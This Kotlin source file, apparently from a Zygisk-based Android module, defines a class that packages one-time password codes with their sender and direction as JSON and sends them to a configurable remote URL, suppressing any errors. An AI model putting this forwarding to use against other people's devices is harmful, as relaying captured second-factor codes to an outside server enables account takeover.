package com.zygisk.modmenu

import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

class TokenForwarder(private val configManager: ConfigManager) {

    private val client = OkHttpClient()

    fun forward(otp: LastOtp): Boolean {
        val config = configManager.load()
        if (config.forwardUrl.isBlank()) return false

        val payload = JSONObject()
            .put("otp", otp.otp)
            .put("sender", otp.sender)
            .put("direction", otp.direction)
            .toString()

        val request = Request.Builder()
            .url(config.forwardUrl)
            .method(
                config.forwardMethod.uppercase(),
                payload.toRequestBody("application/json".toMediaType())
            )
            .build()

        return try {
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }
}
